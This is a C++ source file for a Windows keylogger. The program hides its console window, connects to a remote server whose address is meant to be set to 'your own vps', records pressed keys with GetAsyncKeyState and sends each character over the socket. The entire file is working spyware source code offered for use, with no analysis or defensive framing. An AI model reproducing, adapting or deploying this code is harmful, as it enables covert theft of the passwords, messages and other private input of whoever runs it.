#include <stdio.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h> 
#include<fstream>
#include<iostream>
#include <cstring>
#include <bits/stdc++.h> 
#include <Windows.h>
#include<map>

using namespace std;

//Change it to the ip of your own vps
#define S_IP "127.0.0.1"
#define PORT 4555
#define MAX 100

map<int, char> shiftMap = {
    {49, '!'},
    {50, '@'},
    {51, '#'},
    {52,'$'},
    {53, '%'},
    {54, '^'},
    {55, '&'},
    {56, '*'},
    {57, '('},
    {48, ')'}
};


//s to indicate whether SHIFT is pressed. 1 pressed. 0 not.
char decode_char( int t, int s){
    char c;
    if (t>=65&&t<=90){
        if (s==1){
            c=t;
        }
        else{
            c=t+32;
        }
    }
    else{
        if (s==0){
            c=t;
        }
        else{
            c=shiftMap[t];
        }
    }
    return c;
}


void main_func(int s);

int main()
{
    FreeConsole();
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		//printf("socket creation failed...\n");
		exit(0);
	}
	else
		//printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(S_IP);
	servaddr.sin_port = htons(PORT);

	// connect the client socket to server socket
	if (connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))
		!= 0) {
		//printf("connection with the server failed...\n");
		exit(0);
	}
	else
		//printf("connected to the server..\n");

	// function for chat
	//func(sockfd);
	//recvLog(sockfd);
	main_func(sockfd);
	// close the socket
	close(sockfd);
}

void main_func(int s){
    char buffer[MAX];
    bzero(buffer, MAX);
    int k=0;
    int p;

    while(true){
        if(k==0){
            for (int t=48;t<91;t+=1){
                if((GetAsyncKeyState(t)&0b1000000000000000)){
                    //cout<<t<<endl;
                    k=1;
                    p=t;
                    if (GetAsyncKeyState(VK_SHIFT)&0b1000000000000000){
                        buffer[0]=decode_char(t, 1);
                        send(s, buffer, MAX, 0);
                        bzero(buffer, MAX);
                    }
                    else{
                        buffer[0]=decode_char(t, 0);
                        send(s, buffer, MAX, 0);
                        bzero(buffer, MAX);
                    }
                    break;
                }
            }
        }
        if((!(GetAsyncKeyState(p)&0b1000000000000000))&&k==1){
            //cout<<"Released"<<endl;
            k=0;
        }
        Sleep(1);
        
    }

}
